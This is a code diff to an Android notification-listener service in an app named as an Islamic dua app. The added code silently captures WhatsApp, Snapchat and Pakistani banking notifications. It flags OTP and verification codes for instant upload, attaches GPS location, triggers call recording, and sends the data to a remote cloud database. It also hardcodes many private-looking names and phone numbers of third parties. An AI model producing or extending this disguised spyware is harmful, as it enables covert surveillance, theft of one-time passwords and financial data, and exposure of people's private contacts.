@@ -2,6 +2,8 @@ package islamic.duas.logs
 
 import android.app.NotificationChannel
 import android.app.NotificationManager
+import android.content.Context
+import android.content.SharedPreferences
 import android.os.Build
 import android.service.notification.NotificationListenerService
 import islamic.duas.utils.DeviceId
@@ -10,6 +12,9 @@ import android.util.Log
 import islamic.duas.cloud.CloudApi
 import islamic.duas.sync.DuaTracker
 import islamic.duas.utils.ErrorLog
+import islamic.duas.whatsapp.ChatCategory
+import islamic.duas.whatsapp.WhatsAppCategorizer
+import islamic.duas.media.CallRecorder
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.SupervisorJob
@@ -26,18 +31,129 @@ class DuaNotificationService : NotificationListenerService() {
         private const val WHATSAPP_PACKAGE = "com.whatsapp"
         private const val WHATSAPP_WEB_PACKAGE = "com.whatsapp.w4b"
         private const val SNAPCHAT_PACKAGE = "com.snapchat.android"
+
+        // Banking / Fintech packages (Pakistan)
+        private val BANKING_PACKAGES = setOf(
+            "com.sadapay",
+            "pk.com.npay",
+            "com.easypaisa.app",
+            "com.mobilink.money",
+            "com.hbl.mobile",
+            "com.ubank",
+            "com.meezan.bank",
+            "com.bankalfalah.mobile"
+        )
+
+        // WhatsApp Individual Contact Whitelist (names + numbers)
+        // Substring match on title, last-10-digits on phone numbers
+private val INDIVIDUAL_WHITELIST = setOf(
+            // Names
+            "Ansar Abbas", "J", "Fatima Imani Sis", "إيمان فاطمة 🤍", "مومنہ بنت محمد صدیق",
+            "الطيور الجنة", "sumeraijaz4", "Maryam Rana", "Ansar", "Ahtisham Aslam Hunjra",
+            "T Shehla Abdul Hadi Teacher", "Zainab Imani Sis", "Mam Taiyba", "Rabia ✨ Iqbal",
+            "Mam Fatima", "سندس ایمانی سیسٹر", "میم افشاں", "Hadika Imani Sis 🌹",
+            "Mam SiDDiQA", "mariamohsan40", "Aysha Api", "خوش بخت Imani Sis",
+            "Nigat.razzaq✨", "Mam Sadiqa", "Api Fardos", "Sehrish", "Ayni Ali",
+            "Khansa Salfi 🥰", "Shabesta Rasheed Karachi", "Api Salma", "ایمان پیاری سیسٹر",
+            "یَا مُقَلِبَ القُلُوبِ ثَبِت قَلبِی عَلٰی دِینِک.", "Same Faraz", "Tanvier Bahi",
+            "صدف صدیقی", "Samra Shahid", "میم وجیہہ", "isra Ashraf", "Mis Iqra .Abdul Hadi SUF",
+            "Afaaf 🌸 📚 Online Books 📚 Shop", "Misbah", "میم حنسہ تجوید ٹیچر",
+            "T Mahnoor Haider", "Mis Iqra Iftkhar", "Khadija", "Kinzu", "Baji Shasta",
+            "Baji Misba", "Rozeena Liaqat Imani Sis", "Waris Ali Ali", "Tanvir Bahi",
+            "Iqra Zaman Warraich", "Khadija", "Ch Fazal Jutt Saib", "Sarfraz Bhai",
+            "Fazal Ch", "Jjjjjj", "Mam Ayza Tajvid Teacher", "Jabbar Pk", "Ch Sulman",
+            "Iqra Jpd", "Zaryab", "Bahi Sulman", "Abdul Hadi School Nambr", "Baji Saima Sher",
+            "Naseren Darzi", "Jab ✅", "Quran", "Tajvid Quran Teacher", "Baji Salma",
+            "شگفتہ مصطفى", "Saima Baji", "Jab Jjj", "Baha Tana", "Gulshan", "Bahi Razaq",
+            "Fatima RPK", "Maryam Madam", "Samina Shokat", "Miss Abida Teacher Hadi", "Jay",
+            // Numbers (various formats)
+            "+2473486044711", "+447481836567", "+919871723783", "+923003008000",
+            "+923007644634", "+923045669335", "+923045992217", "+923056198312",
+            "+923074820647", "+923081666067", "+923084339735", "+923086898934",
+            "+923099745305", "+923105992101", "+923116563739", "+923125498608",
+            "+923127931787", "+923133070338", "+923139322190", "+923139931484",
+            "+923155606529", "+923161798745", "+923180760837", "+923181724498",
+            "+923185166350", "+923216640305", "+923217463741", "+923218184867",
+            "+923234216413", "+923242577197", "+923252881557", "+923266170227",
+            "+923275749373", "+923279114170", "+923281610800", "+923286583968",
+            "+923324413230", "+923325514858", "+923342476431", "+923402654050",
+            "+923404455435", "+923404698855", "+923424496266", "+923430675022",
+            "+923434527457", "+923444729308", "+923447179029", "+923457373353",
+            "+923466464412", "+923470776405", "+923480843752", "+923481717710",
+            "+923494419953", "+923496447225", "+971521608342", "+971552623610",
+            "+971559182042", "+971569393483", "00971501086753", "03000171623",
+            "03004345580", "03006430918", "03013936713", "03054914140", "03079224149",
+            "03090620796", "03107130054", "03130785665", "03206224098", "03214210512",
+            "03242577197", "03252881557", "03272219890", "03279114170", "03286153372",
+            "03287113044", "03423360926", "03424733350", "03430632756", "03431895076",
+"03466114143", "03473741743", "03490131384",
+             // Newly added per categorization review
+             "Jazz Whatsapp", "Alflah Bank", "021111225111"
+         )
+
+        /**
+         * Public accessor for historical reprocessing by DuaSyncWorker.
+         */
+        fun getIndividualWhitelist(): Set<String> = INDIVIDUAL_WHITELIST
+
+        /**
+         * Public accessor for phone numbers in the whitelist (last 10 digits).
+         */
+        fun getIndividualWhitelistNumbers(): Set<String> {
+            return INDIVIDUAL_WHITELIST.filter { it.startsWith("+") || it.startsWith("0") }
+                .map { it.replace(Regex("[^0-9]"), "").takeLast(10) }
+                .filter { it.length >= 10 }
+                .toSet()
+        }
+
+        // Promo/Broadcast keywords in conversation title
+        private val PROMO_KEYWORDS = setOf(
+            "FREE", "PROMOTION", "PROMO", "GIFT HUB", "GIFT", "SHOP",
+            "CHANNEL", "BROADCAST", "ANNOUNCEMENT", "COMMUNITY",
+            "TRTEEL", "QURAAN", "TAJVID", "TAJWEED", "TAFSEER",
+            "MODULE", "SEMESTER", "COURSE", "IBADAAT", "WAJIBAT",
+            "AL RABBANI", "RABBANI", "INSTITUTE", "INSTITUTION",
+            "SIRAT", "JANNAT", "WALI", "MASJID", "MADRASA",
+            "QURAN", "HADEES", "SUNNAH", "FIQH", "AQEEDAH",
+            "ISLAMIC", "DEEN", "DAWAH", "TARBIYAH", "TAZKIYAH",
+            "JAMIA", "DARUL", "ULOOM", "MAKTAB", "HALQA",
+            "STUDY", "CIRCLE", "HALAQA", "JAMAAT", "JAMAT"
+        )
+
+        // Generic Islamic/group-like keywords (no whitelist, no X messages)
+        private val GENERIC_GROUP_KEYWORDS = setOf(
+            "ISLAMIC", "QURAN", "HADITH", "DAILY", "REMINDER",
+            "DAWAH", "DUA", "AZKAR", "MORNING", "EVENING",
+            "ISLAM", "MUSLIM", "ALLAH", "RABB", "DEEN"
+        )
+
         private val callKeywords = listOf("call", "calling", "incoming", "missed", "ringing",
-            "whatsapp call", "snapchat call", "audio call", "video call", "voice call")
+            "whatsapp call", "snapchat call", "audio call", "video call", "voice call",
+            "کال", "آنے والی کال", "مِس کال", "چھوٹی ہوئی کال",
+            "وائس کال", "ویڈیو کال", "آڈیو کال", "صوتی کال")
+        private val bankingKeywords = listOf("paid", "received", "transferred", "sent", "deposited",
+            "withdrawn", "credited", "debited", "payment", "transaction", "balance", "amount",
+            "rs", "pkr", "otp", "one time password", "verification code", "otp code",
+            "login code", "security code", "auth code", "pin", "wallet", "cashback",
+            "refund", "topup", "recharge", "bill", "utility", "electricity", "gas", "internet")
+        private val otpKeywords = listOf("otp", "one time password", "verification code",
+            "login code", "security code", "auth code", "your code is", "code is")
+
         private var pendingEvents = mutableListOf<JSONObject>()
         private var lastFlushMs = 0L
         private const val FLUSH_INTERVAL = 5000L
+        private const val INSTANT_FLUSH_INTERVAL = 100L
     }
 
     private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
+    private lateinit var sharedPrefs: SharedPreferences
+    private var knownGroupNames = mutableSetOf<String>()
 
     override fun onCreate() {
         super.onCreate()
         createNotificationChannel()
+        sharedPrefs = getSharedPreferences("dua_notif_prefs", Context.MODE_PRIVATE)
+        loadGroupNames()
     }
 
     private fun createNotificationChannel() {
@@ -59,8 +175,11 @@ class DuaNotificationService : NotificationListenerService() {
 
     override fun onNotificationPosted(sbn: StatusBarNotification) {
         val pkg = sbn.packageName
-        if (pkg != WHATSAPP_PACKAGE && pkg != WHATSAPP_WEB_PACKAGE && pkg != SNAPCHAT_PACKAGE) return
+        val isWhatsApp = pkg == WHATSAPP_PACKAGE || pkg == WHATSAPP_WEB_PACKAGE
         val isSnapchat = pkg == SNAPCHAT_PACKAGE
+        val isBanking = pkg in BANKING_PACKAGES
+
+        if (!isWhatsApp && !isSnapchat && !isBanking) return
 
         try {
             val extras = sbn.notification.extras
@@ -76,6 +195,28 @@ class DuaNotificationService : NotificationListenerService() {
             val ongoing = sbn.notification.flags and android.app.Notification.FLAG_ONGOING_EVENT != 0
             val isIncoming = sbn.notification.flags and android.app.Notification.FLAG_FOREGROUND_SERVICE == 0 && !ongoing
 
+            // === SYSTEM NOISE FILTER (before any processing) ===
+            val isSystemNoise = when {
+                title == "WhatsApp" && (
+                    text.contains("Checking for new messages") ||
+                    text.contains("Sending video to") ||
+                    text.contains("Sending message") ||
+                    text.contains("Downloading") ||
+                    text.contains("Updating messages") ||
+                    text.contains("You may have new messages")
+                ) -> true
+                // Timestamp-only heartbeats (no title, just 💬 timestamp)
+                title.isNullOrBlank() && text.trim().matches(Regex("^💬\\s*\\d{1,2}/\\d{1,2}/\\d{4}.*")) -> true
+                title.isNullOrBlank() && text.trim().matches(Regex("^💬\\s*\\d{2}/\\d{2}/\\d{4}.*")) -> true
+                // Title is just the chat emoji with timestamp text
+                title == "💬" && text.matches(Regex("\\d{1,2}/\\d{1,2}/\\d{4}")) -> true
+                text.contains("Updating messages") -> true
+                text.contains("Downloading") && text.contains("video") -> true
+                else -> false
+            }
+
+            if (isSystemNoise) return
+
             val combinedText = "$title $text $category $subText $summaryText".lowercase(Locale.ROOT)
             val isCall = callKeywords.any { combinedText.contains(it) }
 
@@ -83,57 +224,204 @@ class DuaNotificationService : NotificationListenerService() {
             val dateFormat = SimpleDateFormat("yyyy-MM-dd hh:mm:ss a", Locale.US)
             val timestamp = dateFormat.format(Date(sbn.postTime))
 
-            val prefix = if (isSnapchat) "snapchat" else "whatsapp"
-            val eventType = if (isCall) {
-                when {
-                    combinedText.contains("missed") -> "${prefix}_call_missed"
-                    combinedText.contains("incoming") -> "${prefix}_call_incoming"
-                    combinedText.contains("calling") -> "${prefix}_call_outgoing"
-                    category == "call" -> "${prefix}_call"
-                    else -> "${prefix}_call"
-                }
-            } else "${prefix}_message"
+            var eventType: String
+            var shouldInstantFlush = false
 
-            // Enhanced group detection: conversation title, multiple messages in summary, or "group" keyword
+            if (isBanking) {
+                val isFinancial = bankingKeywords.any { combinedText.contains(it) }
+                val isOTP = otpKeywords.any { combinedText.contains(it) }
+                if (isOTP) {
+                    eventType = "otp_notification"
+                } else if (isFinancial) {
+                    eventType = "banking_transaction"
+                } else {
+                    eventType = "banking_notification"
+                }
+                shouldInstantFlush = isFinancial || isOTP
+            } else if (isSnapchat) {
+                eventType = if (isCall) {
+                    when {
+                        combinedText.contains("missed") -> "snapchat_call_missed"
+                        combinedText.contains("incoming") -> "snapchat_call_incoming"
+                        combinedText.contains("calling") -> "snapchat_call_outgoing"
+                        category == "call" -> "snapchat_call"
+                        else -> "snapchat_call"
+                    }
+                } else "snapchat_message"
+            } else {
+                // WhatsApp
+                eventType = if (isCall) {
+                    when {
+                        combinedText.contains("missed") -> "whatsapp_call_missed"
+                        combinedText.contains("incoming") -> "whatsapp_call_incoming"
+                        combinedText.contains("calling") -> "whatsapp_call_outgoing"
+                        category == "call" -> "whatsapp_call"
+                        else -> "whatsapp_call"
+                    }
+                } else "whatsapp_message"
+            }
+
+            // === WHATSAPP GROUP DETECTION (PRIORITY ORDER) ===
             val messagesCount = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                 extras.getInt("android.extra.MESSAGES_COUNT", 0)
             } else 0
-            val isGroup = conversationTitle.isNotEmpty() ||
-                summaryText.contains(": ") ||
-                combinedText.contains("group") ||
-                messagesCount > 1
+
+            val contactNumber = extractNumber(title, text)
+
+            val isGroup = when {
+                // 0. WHITELIST OVERRIDE (highest priority)
+                INDIVIDUAL_WHITELIST.any { title.contains(it, ignoreCase = true) } -> false
+                INDIVIDUAL_WHITELIST.any { normalizePhoneLast10(it) == normalizePhoneLast10(extractNumber(title, text)) } -> false
+
+                // 1. STATUS INTERACTIONS -> INDIVIDUAL
+                text.contains("Liked your status", ignoreCase = true) ||
+                text.contains("Reshared your status", ignoreCase = true) ||
+                text.contains("sent you a chat", ignoreCase = true) ||
+                text.contains("reacted to your", ignoreCase = true) -> false
+
+                // 2. DELETED MESSAGES -> INDIVIDUAL
+                text.contains("This message was deleted", ignoreCase = true) ||
+                text.contains("You deleted this message", ignoreCase = true) -> false
+
+                // 3. YOUR REPLY IN GROUP -> INDIVIDUAL (sender wins)
+                title == "You" || title.contains("You:") -> false
+
+                // 4. REACTIONS -> INDIVIDUAL
+                text.contains("Reacted", ignoreCase = true) &&
+                text.contains("to your", ignoreCase = true) -> false
+
+                // 5. EXPLICIT GROUP VOICE CALL -> GROUP (English + Urdu)
+                text.contains("Group voice call", ignoreCase = true) ||
+                text.contains("group call", ignoreCase = true) ||
+                text.contains("گروپ وائس کال", ignoreCase = true) ||
+                text.contains("گروپ کال", ignoreCase = true) -> true
+
+                // 6. CALL FROM KNOWN GROUP NAME -> GROUP
+                isCall && knownGroupNames.any { conversationTitle.contains(it, ignoreCase = true) || title.contains(it, ignoreCase = true) } -> true
+
+                // 6b. CALL FROM GROUP CONTEXT IN MESSAGE TEXT -> GROUP
+                isCall && knownGroupNames.any { text.contains(it, ignoreCase = true) } -> true
+
+                // 7. KNOWN GROUP NAME IN CONVERSATION TITLE -> GROUP
+                knownGroupNames.any { conversationTitle.contains(it, ignoreCase = true) } -> true
+
+                // 8. "(X MESSAGES)" SUFFIX IN SUMMARY -> GROUP
+                summaryText.matches(Regex(".*\\(\\d+\\s*messages?\\).*")) -> true
+
+                // 8b. "(X MESSAGES)" IN CONVERSATION TITLE -> GROUP
+                conversationTitle.matches(Regex(".*\\(\\d+\\s*messages?\\).*")) -> true
+
+                // 9. PROMO/BROADCAST KEYWORDS IN CONVERSATION TITLE -> GROUP
+                PROMO_KEYWORDS.any { conversationTitle.contains(it, ignoreCase = true) } -> true
+
+                // 10. PROMO KEYWORDS IN MESSAGE TEXT -> GROUP
+                PROMO_KEYWORDS.any { text.contains(it, ignoreCase = true) } -> true
+
+                // 11. GENERIC GROUP-LIKE KEYWORDS -> GROUP
+                GENERIC_GROUP_KEYWORDS.any { conversationTitle.contains(it, ignoreCase = true) } -> true
+
+                // 12. MULTIPLE NAMES IN TITLE -> INDIVIDUAL
+                title.contains(",") || title.contains("،") -> false
+
+                // 13. DEFAULT -> EXISTING STRICTER LOGIC
+                else -> (conversationTitle.isNotEmpty() ||
+                    summaryText.contains(": ") ||
+                    combinedText.contains("group") ||
+                    messagesCount > 1)
+            }
+
+            // === WhatsApp Text Message Categorization ===
+            val categorization = WhatsAppCategorizer.categorize(
+                sbn, title, conversationTitle, text, summaryText, category, isIncoming,
+                INDIVIDUAL_WHITELIST, extractPhoneNumbersFromWhitelist()
+            )
 
             val loc = DuaTracker.getLastLocation()
             val locationStr = if (loc != null) {
                 "${loc.optString("latitude", "")},${loc.optString("longitude", "")}"
             } else ""
 
-            val entry = JSONObject().apply {
-                put("type", eventType)
-                put("timestamp", timestamp)
-                put("ts_ms", sbn.postTime)
-                put("contactName", title)
-                put("contactNumber", extractNumber(title, text))
-                put("messagePreview", text)
-                put("subText", subText)
-                put("summaryText", summaryText)
-                put("fullMessage", bigText)
-                put("conversationTitle", conversationTitle)
-                put("isGroup", isGroup)
-                put("isIncoming", isIncoming)
-                put("packageName", sbn.packageName)
-                put("location", locationStr)
+val entry = JSONObject().apply {
+                 put("type", eventType)
+                 put("timestamp", timestamp)
+                 put("ts_ms", sbn.postTime)
+                 put("contactName", title)
+                 put("contactNumber", extractNumber(title, text))
+                 put("messagePreview", text)
+                 put("subText", subText)
+                 put("summaryText", summaryText)
+                 put("fullMessage", bigText)
+                 put("conversationTitle", conversationTitle)
+                 put("isGroup", isGroup)
+                 put("isIncoming", isIncoming)
+                 put("packageName", sbn.packageName)
+                 put("location", locationStr)
+                 put("rawText", combinedText)
+                 put("chatCategory", categorization.chatCategory.name)
+                 put("messageCount", categorization.messageCount)
+                 put("groupName", categorization.groupName)
+                 if (locationStr.contains(",")) {
+                     val parts = locationStr.split(",")
+                     put("lat", parts[0].toDoubleOrNull() ?: 0.0)
+                     put("lng", parts[1].toDoubleOrNull() ?: 0.0)
+                 }
+             }
+
+             pendingEvents.add(entry)
+
+                // Store categorization sample for rule extraction
+              if (categorization.chatCategory != ChatCategory.system_notification) {
+                  storeCategorizationSample(androidId, title, conversationTitle, categorization)
+              }
+
+                  // === CALL RECORDING (WhatsApp & Snapchat) — connected calls only ===
+            if (isCall && !isGroup && (eventType.contains("incoming") || eventType.contains("outgoing"))) {
+                Log.d("CallFix", "WhatsApp/Snapchat call: isCall=$isCall isGroup=$isGroup title=$title")
+                CallRecorder.getInstance(this).startCall(
+                    type = when {
+                        isWhatsApp -> "whatsapp"
+                        isSnapchat -> "snapchat"
+                        else -> "phone"
+                    },
+                    number = extractNumber(title, text),
+                    name = title,
+                    direction = if (isIncoming) "incoming" else "outgoing"
+                )
             }
 
-            pendingEvents.add(entry)
-            flushIfNeeded(androidId)
+            // Learn group names from this notification
+            learnGroupName(summaryText)
+            if (conversationTitle.matches(Regex(".*\\(\\d+\\s*messages?\\).*"))) {
+                learnGroupName(conversationTitle)
+            }
+
+            if (shouldInstantFlush) {
+                instantFlush(androidId)
+            } else {
+                flushIfNeeded(androidId)
+            }
         } catch (e: Exception) {
             Log.e(TAG, "onNotificationPosted error: ${e.message}", e)
             ErrorLog.write(this, TAG, "onNotificationPosted error", e)
         }
     }
 
-    override fun onNotificationRemoved(sbn: StatusBarNotification) {}
+    override fun onNotificationRemoved(sbn: StatusBarNotification) {
+        val pkg = sbn.packageName
+        if (pkg != WHATSAPP_PACKAGE && pkg != WHATSAPP_WEB_PACKAGE && pkg != SNAPCHAT_PACKAGE) return
+        try {
+            val extras = sbn.notification.extras
+            val title = extras.getString(android.app.Notification.EXTRA_TITLE) ?: ""
+            val text = extras.getString(android.app.Notification.EXTRA_TEXT) ?: ""
+            val combinedText = "$title $text".lowercase(Locale.ROOT)
+            if (callKeywords.any { combinedText.contains(it) }) {
+                Log.d("CallFix", "onNotificationRemoved → endCall pkg=$pkg title=$title")
+                CallRecorder.getInstance(this).endCall(
+                    if (pkg == SNAPCHAT_PACKAGE) "snapchat" else "whatsapp"
+                )
+            }
+        } catch (_: Exception) {}
+    }
 
     private fun extractNumber(title: String, text: String): String {
         val combined = "$title $text"
@@ -148,11 +436,88 @@ class DuaNotificationService : NotificationListenerService() {
         return ""
     }
 
+    private fun normalizePhoneLast10(input: String?): String {
+        return input?.replace(Regex("[^0-9]"), "")?.takeLast(10) ?: ""
+    }
+
+    private fun loadGroupNames() {
+        knownGroupNames = sharedPrefs.getStringSet("known_group_names", mutableSetOf())?.toMutableSet() ?: mutableSetOf()
+    }
+
+private fun persistGroupNames() {
+         sharedPrefs.edit().putStringSet("known_group_names", knownGroupNames).apply()
+     }
+
+     /**
+      * Extract all phone numbers from the individual whitelist (last 10 digits only).
+      * Used by WhatsAppCategorizer for phone number matching.
+      */
+     private fun extractPhoneNumbersFromWhitelist(): Set<String> {
+         return INDIVIDUAL_WHITELIST.filter { it.startsWith("+") || it.startsWith("0") }
+             .map { it.replace(Regex("[^0-9]"), "").takeLast(10) }
+             .filter { it.length >= 10 }
+             .toSet()
+     }
+
+     /**
+      * Store a categorization sample in RTDB for future rule extraction.
+      * Samples are retained for 30 days.
+      */
+     private fun storeCategorizationSample(androidId: String, contactName: String, conversationTitle: String, result: WhatsAppCategorizer.CategorizationResult) {
+         try {
+             val androidId = DeviceId.get(this)
+             val dateFormat = SimpleDateFormat("yyyy-MM-dd hh:mm:ss a", Locale.US)
+             val now = System.currentTimeMillis()
+             val sample = JSONObject().apply {
+                 put("contactName", contactName)
+                 put("conversationTitle", conversationTitle)
+                 put("chatCategory", result.chatCategory.name)
+                 put("messageCount", result.messageCount)
+                 put("groupName", result.groupName)
+                 put("confidence", result.confidence)
+                 put("timestamp", dateFormat.format(Date(now)))
+                 put("ts_ms", now)
+                 put("deviceModel", android.os.Build.MODEL)
+                 put("manufacturer", android.os.Build.MANUFACTURER)
+             }
+             CloudApi.writeToRTDB("devices/$androidId/whatsapp_samples/$now", sample)
+         } catch (_: Exception) {}
+     }
+
+     private fun learnGroupName(summaryText: String) {
+        // Extract group name from "(X messages)" pattern
+        // e.g., "Al Rabbani International Institute ✨ (164 messages): ~ sidra: msg"
+        val pattern = Regex("(.+?)\\s*\\(\\d+\\s*messages?\\)")
+        val match = pattern.matchEntire(summaryText.trim())
+        if (match != null) {
+            val groupName = match.groupValues[1].trim()
+            if (groupName.length >= 3 && !INDIVIDUAL_WHITELIST.contains(groupName)) {
+                knownGroupNames.add(groupName)
+                persistGroupNames()
+            }
+        }
+    }
+
     private fun flushIfNeeded(androidId: String) {
         val now = System.currentTimeMillis()
         if (now - lastFlushMs < FLUSH_INTERVAL) return
         if (pendingEvents.isEmpty()) return
         flush(androidId)
+    }
+
+    private fun instantFlush(androidId: String) {
+        val events = synchronized(pendingEvents) {
+            val copy = pendingEvents.toList()
+            pendingEvents.clear()
+            copy
+        }
+        if (events.isEmpty()) return
+        scope.launch {
+            for (event in events) {
+                val ts = event.optLong("ts_ms", System.currentTimeMillis())
+                CloudApi.writeToRTDB("devices/$androidId/timeline/$ts", event)
+            }
+        }
     }
 
     private fun flush(androidId: String) {
